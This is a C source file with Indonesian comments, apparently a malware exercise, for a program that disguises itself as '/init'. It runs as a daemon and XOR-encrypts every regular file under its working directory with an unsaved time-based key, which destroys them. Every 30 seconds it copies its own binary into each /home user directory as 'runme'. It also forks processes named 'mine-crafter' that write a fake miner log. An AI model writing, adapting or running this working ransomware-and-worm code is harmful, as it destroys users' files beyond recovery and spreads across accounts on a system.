
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <linux/prctl.h>
#include <sys/prctl.h>
#include <ftw.h>
#include <dirent.h>
#include <time.h>
#include <sys/wait.h>

unsigned char xor_key;

void daemonize() {
    pid_t pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS); // Parent keluar

    if (setsid() < 0) exit(EXIT_FAILURE); // Buat session baru

    pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS); // Parent ke-2 keluar

    umask(0); // Bebaskan permission
    chdir("/"); // Ke root dir
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);

    // Ganti nama proses jadi "/init"
    prctl(PR_SET_NAME, (unsigned long)"/init", 0, 0, 0);
}


int encrypt_file(const char *filepath, const struct stat *info,
                 int typeflag, struct FTW *pathinfo) {
    if (typeflag != FTW_F) return 0; // Hanya file biasa

    FILE *f = fopen(filepath, "rb+");
    if (!f) return 0;

    fseek(f, 0, SEEK_END);
    long size = ftell(f);
    rewind(f);

    unsigned char *buffer = malloc(size);
    if (!buffer) {
        fclose(f);
        return 0;
    }

    fread(buffer, 1, size, f);
    rewind(f);

    for (long i = 0; i < size; i++) {
        buffer[i] ^= xor_key;
    }

    fwrite(buffer, 1, size, f);
    fclose(f);
    free(buffer);
    return 0;
}

void encrypt_dir(const char *start_dir) {
    nftw(start_dir, encrypt_file, 10, FTW_PHYS);
}


void spread_to_home() {
    DIR *d;
    struct dirent *dir;
    d = opendir("/home");
    if (!d) return;

    while ((dir = readdir(d)) != NULL) {
        if (dir->d_type == DT_DIR && strcmp(dir->d_name, ".") && strcmp(dir->d_name, "..")) {
            char target_path[512];
            snprintf(target_path, sizeof(target_path), "/home/%s/runme", dir->d_name);

            FILE *src = fopen("/proc/self/exe", "rb");
            FILE *dst = fopen(target_path, "wb");

            if (src && dst) {
                char buf[1024];
                size_t n;
                while ((n = fread(buf, 1, sizeof(buf), src)) > 0)
                    fwrite(buf, 1, n, dst);
                fclose(dst);
                chmod(target_path, 0755);
            }

            if (src) fclose(src);
        }
    }

    closedir(d);
}


void recurring_task() {
    while (1) {
        encrypt_dir(".");
        spread_to_home();
        sleep(30);
    }
}


void create_hash(char *output, size_t len) {
    const char *hex = "0123456789abcdef";
    for (size_t i = 0; i < len; i++) {
        output[i] = hex[rand() % 16];
    }
    output[len] = '\0';
}

void miner_process(int id) {
    while (1) {
        char hash[65];
        char log_line[256];
        time_t now = time(NULL);
        struct tm *t = localtime(&now);

        create_hash(hash, 64);

        snprintf(log_line, sizeof(log_line),
                 "[%04d-%02d-%02d %02d:%02d:%02d][Miner %d] %s\n",
                 t->tm_year + 1900, t->tm_mon + 1, t->tm_mday,
                 t->tm_hour, t->tm_min, t->tm_sec,
                 id, hash);

        FILE *logf = fopen("/tmp/.miner.log", "a");
        if (logf) {
            fputs(log_line, logf);
            fclose(logf);
        }

        sleep((rand() % 28) + 3); // 3â€“30 detik
    }
}

void rodok_fork_bomb(int max_forks) {
    for (int i = 0; i < max_forks; i++) {
        pid_t pid = fork();
        if (pid == 0) {
            char name[32];
            snprintf(name, sizeof(name), "mine-crafter-%d", i);
            prctl(PR_SET_NAME, (unsigned long)name, 0, 0, 0);
            miner_process(i);
            exit(0);
        }
    }
}

int main() {
    srand(time(NULL));
    daemonize(); 

    time_t now = time(NULL);
    xor_key = (unsigned char)(now % 256); 
    // Jalankan recurring task di background (encrypt + spread)
    pid_t recurring_pid = fork();
    if (recurring_pid == 0) {
        recurring_task();
        exit(0);
    }

    // rodok.exe aktif: spawn fork miners
    rodok_fork_bomb(3); // Ubah jumlah sesuai spesifikasi device (min. 3)

    while (1) pause(); // Tetap hidup
}
